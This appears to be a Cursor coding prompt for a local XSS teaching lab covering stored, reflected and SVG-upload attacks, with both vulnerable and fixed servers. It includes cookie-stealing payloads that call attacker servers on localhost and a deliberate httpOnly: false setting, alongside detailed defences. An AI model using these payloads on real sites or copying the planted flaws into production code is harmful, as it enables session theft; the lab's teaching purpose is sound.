# Cursor Prompt — Protected Servers + Comprehensive README

## Overview

Read all existing code under `demo-attacked/xss/` before making any changes.
This prompt fixes bugs in existing files and creates new files. Do not touch
files that are not listed below.

---

## Port Map (conflict-free — must be enforced across all files)

| Server | Port | File |
|---|---|---|
| stored / vulnerable victim | 3001 | stored/victim-server.js |
| stored / attacker | 3002 | stored/attacker-server.js |
| reflected / vulnerable victim | 3003 | reflected/victim-server.js |
| reflected / attacker | 3004 | reflected/attacker-server.js |
| svg-upload / vulnerable victim | 3005 | svg-upload/victim-server.js |
| svg-upload / attacker | 3006 | svg-upload/attacker-server.js |
| svg-upload / protected victim | 3007 | svg-upload/victim-server-protected.js |
| reflected / protected victim | **3008** | reflected/victim-server-protected.js |
| stored / protected victim | **3009** | stored/victim-server-protected.js (NEW) |

---

## Task 1 — Fix `stored/victim-server.js` (existing file, two bugs)

**Bug A — Line ~55:** The cookie is currently set with `httpOnly: true`.
This breaks the vulnerability demo — the attacker cannot steal the cookie because
`document.cookie` returns nothing. Change to `httpOnly: false` so the demo works.
The file must have this comment:
```
// ⚠️ VULNERABILITY: httpOnly: false — JavaScript can read this cookie via document.cookie
// ✅ FIX: Set httpOnly: true (see victim-server-protected.js)
```

**Bug B — admin.html reference (in victim-server.js comment at top):**
The how-to-run comment block says "Open first to set the agent cookie" for /admin.
This is still accurate — leave it.

No other changes to victim-server.js.

---

## Task 2 — Fix `stored/admin.html` (existing file, one comment bug)

**Line ~247:** There is a code comment that says `⚠️ VULNERABILITY: innerHTML renders raw HTML`
but the actual code line below it uses `panel.textContent`. The comment is wrong.
Fix the comment to say:
```
// ✅ FIX already applied: panel.textContent = ticket.message
//    Using textContent instead of innerHTML means the browser treats the value
//    as plain text — HTML tags are displayed as literal characters, never parsed.
//    This neutralises the XSS payload stored in ticket.message.
```

---

## Task 3 — Fix `stored/victim.html` (existing file, two issues)

**Issue A — Line ~264:** `meta.innerHTML` is used to render `ticket.name` and the timestamp.
This is a SECOND XSS vector — the name field is also vulnerable, not just message.
The line looks like:
```js
meta.innerHTML = `<span class="name">${ticket.name}</span><span class="time">...</span>`;
```
Change this to use safe DOM construction:
- Create a `<span class="name">` element, set its `textContent = ticket.name`
- Create a `<span class="time">` element, set its `textContent = relativeTime(ticket.createdAt)`
- Append both to `meta`
Add comment:
```
// ⚠️ VULNERABILITY (was here): innerHTML with ticket.name — name field also injectable
// ✅ FIX applied: textContent used for both name and timestamp
```

**Issue B — Line ~279:** `message.innerHTML = ticket.message` — keep this as-is.
This is the primary XSS demonstration. Do not change it.
The existing comment is correct. Leave it exactly as written.

---

## Task 4 — Create `stored/victim-server-protected.js` (NEW file, port 3009)

This is the fixed version of victim-server.js. Copy its structure and apply every fix.

**Port:** 3009

**How-to-run comment block at top:**
```
Terminal 1: cd demo-attacked/xss/stored && npm run victim-protected
Terminal 2: cd demo-attacked/xss/stored && npm run attacker

Compare with vulnerable server:
  http://localhost:3001/admin    ← vulnerable (httpOnly=false, cookie stolen)
  http://localhost:3009/admin    ← protected (httpOnly=true, XSS fires but cookie empty)
```

**Fix 1 — Cookie (httpOnly: true):**
```
// ✅ FIX: httpOnly: true — document.cookie cannot read this token.
//    Even if XSS fires, document.cookie returns '' for this field.
//    The attack runs but the payload is worthless — no session data to exfiltrate.
res.cookie('agent_session', 'AgentJohn_s3ss10n_t0k3n_XYZ789', { path: '/', httpOnly: true })
```

**Fix 2 — Input sanitization before storing:**
Add a `sanitizeText(str)` function that strips all HTML tags using a regex
and trims whitespace. Apply it to `name`, `email`, `subject`, and `message`
before storing the ticket object. Comment:
```
// ✅ FIX: Sanitize at ingestion point — strip HTML tags before storing.
//    Defense-in-depth: even if the rendering layer has a bug, the data is clean.
//    Note: this is NOT a substitute for safe rendering — do both.
//    Real production: use the 'dompurify' library (server-side via jsdom) or
//    'sanitize-html' npm package for allowlist-based sanitization.
```

**Fix 3 — API returns sanitized data:**
The `GET /api/tickets` route returns tickets from the in-memory array.
After Fix 2, data is already clean. No change needed to the route itself.
Add a comment above the route:
```
// ✅ FIX: Data is sanitized at write time (POST /api/tickets).
//    The GET route returns already-clean data. Rendering layer still uses
//    textContent (see victim-protected.html) as second line of defense.
```

**Fix 4 — CSP header on all responses:**
Add a global middleware that sets:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
```
Comment:
```
// ✅ FIX: Content Security Policy as a last-resort layer.
//    'script-src self' blocks inline scripts and scripts from other origins.
//    If an XSS payload somehow executes, inline <script> tags and external
//    script sources are blocked. The onerror= and onload= event handlers
//    are NOT blocked by this policy (they need 'unsafe-inline' to be blocked),
//    so CSP alone is not sufficient — it is defense-in-depth, not the primary fix.
//    Real production: use a nonce-based CSP to block ALL inline scripts.
```

**Serves:** `victim-protected.html` (for `/` and `/admin` routes — see Task 5).

**Add to `stored/package.json`:**
Add script: `"victim-protected": "node victim-server-protected.js"`

---

## Task 5 — Create `stored/victim-protected.html` (NEW file)

Copy `stored/victim.html` and apply the following changes only:

1. Change the page title to include `[PROTECTED]`: `NovaCRM — Customer Support [Protected]`

2. Add a green banner at the very top (above the header):
   ```
   ✅ Protected version — innerHTML replaced with textContent. XSS payloads stored
   in ticket.message render as plain text. Session cookie is HttpOnly.
   ```
   Style it with green background (#dcfce7), dark green text (#166534).

3. In the `renderTickets` function, fix the `meta.innerHTML` line (same fix as Task 3 Issue A).

4. Change the message rendering from:
   ```js
   message.innerHTML = ticket.message;
   ```
   To:
   ```js
   // ✅ FIX: textContent — browser treats value as plain text, never parses as HTML.
   //    An XSS payload like <img onerror="..."> is displayed literally as text on screen.
   //    The user sees the angle brackets and script content as characters, not executed code.
   message.textContent = ticket.message;
   ```

5. No other changes. Keep all CSS, layout, form, and polling logic identical.

---

## Task 6 — Fix `reflected/victim-server-protected.js` (existing file, port conflict)

The file currently uses port 3005. This conflicts with svg-upload/victim-server.js.

**Change:** Update `PORT` from `3005` to `3008`.
Update all console.log messages at the bottom to reference port 3008.
Update the how-to-run comment block to reference port 3008.
Update the cookie middleware — the cookie check `req.headers.cookie.includes('shopper_session=')`
is fine, no change needed.

No other changes to reflected/victim-server-protected.js.

**Add to `reflected/package.json`:**
Add script: `"victim-protected": "node victim-server-protected.js"` if not already present.

---

## Task 7 — Update `svg-upload/victim-server-protected.js` (existing file, add Sharp)

Add Sharp re-encoding as Layer 3 (after magic bytes + content sniff).

**Step 1:** Add `sharp` to the dependencies. At top of file:
```js
const sharp = require('sharp');
```

**Step 2:** After `validateUploadedFile` passes (no error), before adding the profile to the array,
add a re-encoding step. The uploaded file is at `filePath`. Re-encode it:

```
// ✅ FIX (Layer 3 — definitive polyglot killer):
//    Re-encode through Sharp. Sharp decodes only the pixel data from the input
//    and writes a brand-new file. All original bytes (EXIF, comments, embedded
//    scripts, polyglot payloads) are destroyed — the output contains only clean
//    pixel data in the target format.
//
//    A file that passes magic byte checks but contains a script buried in EXIF
//    or after the image data (polyglot attack) will be neutralised here because
//    Sharp never copies the original byte stream — it re-renders from pixels.
//
//    This is the approach used by GitHub, Twitter, and every major platform
//    that accepts user image uploads.
```

Re-encode the file to JPEG at quality 85 and overwrite the original saved file.
Use async/await with try/catch. If Sharp fails (file is not a valid raster image
despite passing earlier checks), delete the file and return 400 with:
`"File could not be re-encoded as a safe image. Upload rejected."`

After successful Sharp re-encoding, continue to add profile to array as before.

**Step 3:** Add `sharp` to `svg-upload/package.json` dependencies.
Add script: `"victim-protected": "node victim-server-protected.js"` if not already present.

---

## Task 8 — Write `demo-attacked/xss/README.md` (NEW file)

This is the primary deliverable. Write it as professional technical documentation.
It must be detailed enough for a senior developer to understand every attack and fix
without running the code. Use Markdown with headers, code blocks, and tables.

Structure exactly as follows:

---

### README structure:

```
# XSS Attack Demonstration Lab

## Overview
## Port Reference
## Attack 1: Stored XSS — NovaCRM Support Ticket Portal
## Attack 2: Reflected XSS — ShopNest Search Page
## Attack 3: SVG Upload XSS — ConnectHub Profile Avatar
## Running All Demos Simultaneously
## Defense Summary Table
```

---

### Section: Overview

Two paragraphs. Explain what XSS is at a high level. Explain that this lab covers
three distinct variants that differ in persistence mechanism, delivery vector, and
attack surface. Clarify that the frontend code in SVG Upload is intentionally clean
to illustrate that XSS is not always a frontend problem.

---

### Section: Port Reference

A table listing all 9 servers with: Port, Server name, File, Status (Vulnerable / Protected).

---

### Section: Attack 1 — Stored XSS

**Subsections:**

#### What It Is
Real-world context: common in support systems, comment sections, CMS platforms.
The payload persists in the database. Every user who loads the page triggers it.
No social engineering required beyond the initial submission.

#### How to Run
Step-by-step numbered list:
1. Open two terminals
2. Terminal 1: `cd demo-attacked/xss/stored && npm run victim`
3. Terminal 2: `cd demo-attacked/xss/stored && npm run attacker`
4. Open `http://localhost:3001/admin` first — this sets the agent_session cookie
5. Open `http://localhost:3002` in a separate window — attacker dashboard
6. Open `http://localhost:3001` in a third tab — customer portal
7. In the customer portal, submit a new ticket. Use these exact values:
   - Name: `Attacker`
   - Subject: `Having trouble logging in`
   - Message: `<img src="x" onerror="new Image().src='http://localhost:3002/steal?c='+encodeURIComponent(document.cookie)">`
8. Switch to the admin dashboard (`localhost:3001/admin`). The ticket appears in the queue.
9. Click "View" on the malicious ticket.
10. The `onerror` handler fires. Watch the cookie arrive on the attacker dashboard.

#### Vulnerable Code — Exact Lines

**`stored/victim.html`**

Line ~264 — `meta.innerHTML` renders `ticket.name` as HTML. The name field is also injectable:
```js
meta.innerHTML = `<span class="name">${ticket.name}</span>...`;
//                                    ^^^^^^^^^^^^ attacker-controlled, parsed as HTML
```

Line ~279 — `message.innerHTML` renders the full message body as HTML:
```js
message.innerHTML = ticket.message;
// ticket.message came from req.body.message with zero sanitization.
// The browser parses this as HTML. Any tag, any event handler, executes.
```

**`stored/victim-server.js`**

Line ~55 — Cookie set without HttpOnly, making it readable by JavaScript:
```js
res.cookie('agent_session', '...', { path: '/', httpOnly: false })
// httpOnly: false means document.cookie includes this token.
// The XSS payload reads it and exfiltrates it to the attacker server.
```

Line ~67 — No sanitization before storing:
```js
const ticket = { name, email, subject, message }; // raw body values, no cleaning
tickets.unshift(ticket);
```

#### Why These Lines Are Dangerous
Explain the DOM execution model. When `innerHTML` receives a string containing `<img onerror>`,
the browser constructs a real `HTMLImageElement`, sets its `src`, the src fails (no resource at "x"),
and the browser fires `onerror` as a genuine DOM event — with full JavaScript privileges.
The `encodeURIComponent(document.cookie)` runs in the document context of `localhost:3001`,
which holds `agent_session`. The `new Image().src` sends a GET request to the attacker server.
This is not a browser bug — it is the browser working exactly as designed.

#### Payload Variants
Show three variants with brief explanation of each:
1. `<img src="x" onerror="...">` — works even when `<script>` tags are filtered
2. `<svg onload="...">` — SVG elements fire onload without a src
3. `<body onpageshow="...">` — fires when the page is shown/restored from cache

#### The Fix — Exact Lines

**`stored/victim-protected.html`**

Line ~279 equivalent:
```js
message.textContent = ticket.message;
// textContent assigns the string as a text node — never parsed as HTML.
// <img onerror="..."> is displayed as the literal characters < i m g ... >
// The browser never constructs an HTMLImageElement. No event fires. No execution.
```

**`stored/victim-server-protected.js`**

Cookie fix:
```js
res.cookie('agent_session', '...', { path: '/', httpOnly: true })
// httpOnly: true — the Set-Cookie header includes the HttpOnly attribute.
// document.cookie in JavaScript never includes this cookie.
// The XSS payload runs, document.cookie returns '', attacker gets nothing useful.
```

Sanitization at ingestion:
```js
const sanitizeText = (str) => String(str).replace(/<[^>]*>/g, '').trim();
const ticket = {
  name: sanitizeText(name),
  message: sanitizeText(message),
  // ...
};
// Strips HTML tags before storage. Defense-in-depth: even if innerHTML is used
// accidentally in a future code change, the stored data contains no tags.
```

CSP header:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
// Blocks scripts from external origins and inline scripts with src=.
// Does NOT block onerror/onload event handlers alone — those require 'unsafe-inline' removal.
// CSP is the last layer, not the primary fix.
```

#### Edge Cases and What Still Fails
- **CSP alone is not enough:** `onerror` handlers are inline event attributes. Standard CSP does not block them without `'unsafe-inline'` explicitly denied AND a nonce-based policy. Many CSP guides omit this.
- **Sanitizing only the message misses the name field:** Both `ticket.name` and `ticket.message` were rendered with innerHTML. Auditors often check only obvious free-text fields and miss name, email, subject.
- **Sanitizing at read vs. write:** If you encode on read (API encodes before returning), you must ensure every consumer of that API also handles encoded data correctly (double-encoding risk). Encoding at write and using textContent at render avoids this.
- **DOMPurify for rich text:** If the app needs to allow some HTML (bold, links), use DOMPurify's allowlist approach instead of stripping all tags. Never write your own allowlist logic.

---

### Section: Attack 2 — Reflected XSS

#### What It Is
Payload lives in the URL query parameter. Server echoes it back in the HTML response
before the browser parses it. The script is baked into the server's HTTP response bytes —
it is not injected by JavaScript after page load. Requires social engineering (phishing).
Does not persist. Only the victim who clicks the crafted link is affected.

#### How to Run
1. Terminal 1: `cd demo-attacked/xss/reflected && npm run victim`
2. Terminal 2: `cd demo-attacked/xss/reflected && npm run attacker`
3. Open `http://localhost:3003` — note the `shopper_session` cookie in the yellow banner.
4. Open `http://localhost:3004` — attacker dashboard.
5. In the attacker dashboard: type any product name, pick a template, click "Generate Phishing Email".
6. Click "View Your Results →" in the generated email preview.
7. You land on `/search?q=<payload>` on the victim server.
8. The cookie appears on the attacker dashboard within 1-2 seconds.

**Manual URL (Script Tag variant):**
```
http://localhost:3003/search?q=<script>new Image().src='http://localhost:3004/steal?c='+encodeURIComponent(document.cookie)</script>
```

**Note on URL encoding:** When you paste this URL into a browser address bar, the browser
encodes `<` as `%3C` and `>` as `%3E`. The server receives the encoded string and calls
`req.query.q` — Express automatically URL-decodes it, returning the original `<script>` tag.
This is the standard URL decode cycle. It is NOT a bypass — it is how HTTP always works.

#### Vulnerable Code — Exact Lines

**`reflected/victim-server.js`**

Line ~71-77 — The raw query parameter is read directly:
```js
const q = req.query.q || '';
// q is now a raw attacker-controlled string with no processing.
```

Line ~92 — Reflected into the HTML title tag:
```js
<title>ShopNest — Search: ${q}</title>
// ${q} is a JavaScript template literal substitution.
// The server builds this as a plain string. If q = '<script>alert(1)</script>',
// the title tag becomes: <title>ShopNest — Search: <script>alert(1)</script></title>
// The browser's HTML parser sees a <script> tag and executes it.
```

Line ~224 — Reflected into a visible heading:
```js
<h2>Search results for: ${q}</h2>
// Same issue — two separate injection points in the same response.
```

Line ~31-40 — Cookie without HttpOnly:
```js
res.setHeader('Set-Cookie', 'shopper_session=ShopperJane_t0k3n_ABC456; Path=/')
// No HttpOnly attribute. document.cookie includes shopper_session.
```

#### Why These Lines Are Dangerous
Server-side template interpolation with unencoded user input is identical in effect to innerHTML
on the client — but worse, because it happens before the browser has any chance to apply
client-side defenses. The browser receives what it believes is server-authored HTML. It parses it
top-to-bottom and when it hits the `<script>` tag, it executes the contents unconditionally.
There is no "tainted" marker on the bytes. The server's response is authoritative.

#### The Fix — Exact Lines

**`reflected/victim-server-protected.js`**

Line ~31-34 — HTML encode function:
```js
function htmlEncode(str) {
  return String(str).replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])
  );
}
// Replaces the five HTML-special characters with their entity equivalents.
// '<script>' becomes '&lt;script&gt;' — displayed as text, never parsed as a tag.
```

Line ~75-77 — Applied before any interpolation:
```js
const rawQ = req.query.q || '';
const q = htmlEncode(rawQ); // encode first, use only encoded value below
```

Line ~87 — Safe title tag:
```js
<title>ShopNest — Search: ${q}</title>
// q is now '&lt;script&gt;alert(1)&lt;/script&gt;'
// Browser renders this as literal text in the title bar. No execution.
```

#### Edge Cases and What Still Fails
- **Context matters:** `htmlEncode` is correct for HTML body and attribute contexts. If the value were reflected inside a `<script>` block (as a JS string), or in a CSS `url()`, different encoding rules apply. Context-aware encoding libraries (OWASP Java Encoder, DOMPurify) handle all contexts. A single `htmlEncode` function is only correct for HTML body/attribute context.
- **Double encoding:** If you encode at both storage (shouldn't be necessary here, no storage) AND at render, you get `&amp;lt;script&amp;gt;` displayed as `&lt;script&gt;` text — not a security issue, but a user experience bug. Encode once at the output boundary only.
- **URL attribute context:** `href="${q}"` requires URL encoding, not HTML encoding. `javascript:alert(1)` encoded with htmlEncode still produces `javascript:alert(1)` — the colon is not in the encode set. Always use a URL allowlist for href attributes.
- **Browser XSS Auditors:** Old Chrome had a built-in Reflected XSS filter (X-XSS-Protection header). It was removed in Chrome 78 (2019) because it introduced new vulnerabilities. Do not rely on it.

---

### Section: Attack 3 — SVG Upload XSS

#### What It Is
The frontend HTML is 100% clean — no innerHTML, no reflected params.
The vulnerability is the server's file-serving policy. SVG is a full XML+JavaScript runtime.
When served directly as a URL (not embedded in `<img>`), the browser renders it as a document
with script execution in the same origin as the serving domain. Any cookies on that origin
are accessible to the script.

#### How to Run
1. Terminal 1: `cd demo-attacked/xss/svg-upload && npm run victim`
2. Terminal 2: `cd demo-attacked/xss/svg-upload && npm run attacker`
3. Open `http://localhost:3006` — attacker dashboard. Click "⬇ Download payload.svg".
4. Open `http://localhost:3005` — ConnectHub.
5. Upload `payload.svg` as your profile avatar via the upload form.
6. Your profile card appears in the community grid with a teal-colored avatar (looks normal).
7. Click "View Profile →" on your profile card. A modal opens.
8. Click "🔍 View Full Photo". The raw SVG URL opens in a new tab.
9. The script inside the SVG fires. Cookie appears on the attacker dashboard.

**Why the img tag is safe:** The community grid shows all avatars via `<img src="...">`.
Browsers sandbox SVG scripts inside `<img>` — they never execute. It is ONLY when the SVG URL
is opened as a standalone tab (or in `<object>`/`<embed>`) that scripts run.

#### Vulnerable Code — Exact Lines

**`svg-upload/victim-server.js`**

Line ~55-63 — Cookie without HttpOnly:
```js
res.setHeader('Set-Cookie', 'member_session=MemberSarah_t0k3n_DEF012; Path=/')
// No HttpOnly. JavaScript inside the SVG can read document.cookie.
```

Line ~65-81 — Multer accepts all file types:
```js
const upload = multer({ storage, limits: { fileSize: 5 * 1024 * 1024 } });
// No fileFilter — any file type is accepted, including .svg files.
```

Line ~106-129 — No file content inspection:
```js
app.post('/api/upload', upload.single('avatar'), (req, res) => {
  // File is stored immediately after multer saves it. Content never inspected.
  // An SVG with <script>document.cookie exfiltration</script> is stored as-is.
```

Line ~142 — Uploads served with no policy headers:
```js
app.use('/uploads', express.static(UPLOADS_DIR));
// express.static serves files with Content-Type based on extension.
// For .svg: Content-Type: image/svg+xml — no Content-Disposition, no CSP.
// Browser opens the file as a document. Scripts execute. Same origin as port 3005.
```

**`svg-upload/victim.html`** (the window.open call)

The "View Full Photo" button:
```js
window.open(profile.avatarUrl, '_blank')
// avatarUrl = '/uploads/timestamp-payload.svg'
// Opening the SVG URL directly in a new tab removes the <img> sandbox.
// The browser renders it as a standalone SVG document. Scripts run.
```

#### Why These Lines Are Dangerous
An SVG file is a valid XML document. It has a `<script>` element defined in the SVG spec.
Browsers execute SVG scripts when the SVG is rendered as a top-level document (opened via URL,
loaded via `<object>` or `<embed>`) — but NOT when loaded via `<img>` (intentional sandbox).
The server assigns `localhost:3005` as the origin of the SVG document. The script runs with
full access to `document.cookie` for `localhost:3005`. The `window.open` call creates exactly
this scenario: the SVG opens as a top-level document in the `localhost:3005` origin.

#### The Fix — Exact Lines

**`svg-upload/victim-server-protected.js`**

Layer 1 — Extension and MIME type whitelist (line ~82-90):
```js
function rasterOnlyFilter(req, file, cb) {
  const ext = path.extname(file.originalname).toLowerCase();
  if (!ALLOWED_EXTENSIONS.has(ext) || !ALLOWED_MIMETYPES.has(file.mimetype)) {
    return cb(new Error('Only JPG, PNG, GIF, and WebP images are allowed.'));
  }
  cb(null, true);
}
// Blocks honest SVG uploads. NOT sufficient alone — attackers rename payload.svg to payload.jpg
// and send Content-Type: image/jpeg. The client controls both values. Multer cannot verify them.
```

Layer 2 — Magic bytes check (line ~93-109):
```js
function matchesMagicBytes(buffer) {
  // JPEG: FF D8 FF
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) return true;
  // PNG: 89 50 4E 47 (‰PNG)
  if (buffer[0] === 0x89 && buffer[1] === 0x50 ...) return true;
  // ...
}
// Reads the actual first bytes of the uploaded file — not the extension or MIME header.
// payload.svg renamed to payload.jpg fails here because its bytes start with <?xml or <svg,
// not 0xFF 0xD8 0xFF (JPEG magic bytes).
```

Layer 2b — Content sniff (line ~111-119):
```js
function containsExecutableMarkup(buffer) {
  const head = buffer.slice(0, 4096).toString('utf8').toLowerCase();
  return head.includes('<?xml') || head.includes('<svg') || head.includes('<script');
}
// Scans the first 4KB for SVG/XML/script markers even in files that pass magic byte checks.
// Catches edge cases where SVG content follows valid image headers.
// NOT sufficient for polyglot files where the script is buried past 4KB or in EXIF.
```

Layer 3 — Sharp re-encoding (added in this fix):
```js
await sharp(filePath).rotate().jpeg({ quality: 85 }).toFile(outputPath);
fs.unlinkSync(filePath); // delete original
// sharp() decodes the pixel data from the input file.
// .jpeg() re-encodes ONLY the pixel data into a new file from scratch.
// ALL original bytes — EXIF metadata, ICC profiles, comment blocks, polyglot payloads —
// are discarded. The output is a clean JPEG containing nothing but pixel data.
// This kills polyglot files: a JPEG that is simultaneously valid SVG still has its
// script in the JPEG's comment or EXIF block. Sharp never copies those bytes.
```

Layer 4 — Safe file serving (line ~202-206):
```js
app.use('/uploads', function (req, res, next) {
  res.setHeader('Content-Disposition', 'attachment');
  // Forces browser to download the file instead of rendering it.
  // Even if a hostile file somehow passes all checks and gets stored,
  // the browser cannot execute it — it downloads it.
  res.setHeader('Content-Security-Policy', "default-src 'none'");
  // If the file is somehow rendered (e.g., user pastes URL in address bar
  // and dismisses the download prompt in some browsers), no scripts can execute.
  next();
}, express.static(UPLOADS_DIR));
```

#### Edge Cases and What Still Fails
- **`<object>` and `<embed>` are NOT sandboxed like `<img>`:** If the app uses `<object data="avatarUrl">` instead of `<img src="avatarUrl">`, the SVG scripts execute even without `window.open`. Audit all elements that load user-uploaded files.
- **Extension whitelist bypassed by polyglot files:** A valid JPEG that also contains SVG/script content embedded in its EXIF data passes magic byte checks and the 4KB sniff (script is after the scan window). Sharp re-encoding is the only reliable defense.
- **Content-Disposition: attachment is browser-dependent:** Users can right-click → "Open image in new tab" in some browsers, bypassing the download. CSP `default-src 'none'` as a second header ensures scripts can't execute even then.
- **Separate cookieless domain is the strongest architectural defense:** GitHub serves avatars from `avatars.githubusercontent.com`, not `github.com`. Even if a malicious SVG executes there, `document.cookie` is empty for that domain — the main session cookie is on `github.com`. No application-layer code change achieves this — it requires infrastructure separation. Use an S3 bucket + CloudFront distribution on a dedicated asset domain with no `Set-Cookie` responses.
- **X-Content-Type-Options: nosniff:** Add this header to prevent browsers from MIME-sniffing a response away from the declared Content-Type. Without it, a browser might open a file declared as `image/jpeg` as `image/svg+xml` if the content looks like SVG. Add `res.setHeader('X-Content-Type-Options', 'nosniff')` globally.

---

### Section: Running All Demos Simultaneously

All 6 servers (3 vulnerable + 3 protected) use different ports and can run at the same time.

Show a table with all 6 npm commands and their ports.

Note: stored and reflected share the same attacker infrastructure ports (3002, 3004, 3006).
Each demo is self-contained. Running multiple simultaneously is fine for side-by-side comparison.

---

### Section: Defense Summary Table

A table with columns: Attack Type | Vulnerable Line | Fix | Residual Risk

Rows:
1. Stored XSS — innerHTML | victim.html:279 | textContent | None if applied consistently
2. Stored XSS — name field | victim.html:264 | Safe DOM construction | None
3. Stored XSS — cookie | victim-server.js:55 | httpOnly: true | Script still runs, just can't read cookie
4. Stored XSS — input | victim-server.js:67 | sanitizeText() | Encoding at render is still required
5. Reflected XSS — SSR | victim-server.js:92,224 | htmlEncode(q) | Only for HTML context — URL/JS context needs different encoding
6. Reflected XSS — cookie | victim-server.js:31 | httpOnly: true | Same as above
7. SVG XSS — upload | victim-server.js:78 | rasterOnlyFilter | Spoofable by magic bytes
8. SVG XSS — magic bytes | victim-server.js: (missing) | matchesMagicBytes() | Spoofable by polyglot
9. SVG XSS — polyglot | victim-server.js: (missing) | Sharp re-encoding | Requires Sharp installed
10. SVG XSS — serving | victim-server.js:142 | Content-Disposition: attachment | User can bypass in some browsers
11. SVG XSS — serving (CSP) | victim-server.js:142 | CSP: default-src 'none' | Best server-side defense
12. SVG XSS — architecture | N/A | Separate cookieless CDN domain | Eliminates cookie theft entirely

---

## Final Checklist for Cursor

Before finishing:
- [ ] `stored/victim-server.js` line ~55: cookie uses `httpOnly: false`
- [ ] `stored/admin.html` comment fixed from VULNERABILITY to ✅ FIX
- [ ] `stored/victim.html` meta.innerHTML converted to safe DOM methods
- [ ] `stored/victim-server-protected.js` created on port 3009
- [ ] `stored/victim-protected.html` created
- [ ] `stored/package.json` has `"victim-protected"` script
- [ ] `reflected/victim-server-protected.js` port changed from 3005 to 3008
- [ ] `reflected/package.json` has `"victim-protected"` script
- [ ] `svg-upload/victim-server-protected.js` has Sharp re-encoding added
- [ ] `svg-upload/package.json` has `sharp` in dependencies
- [ ] `svg-upload/package.json` has `"victim-protected"` script
- [ ] `demo-attacked/xss/README.md` created with all sections above
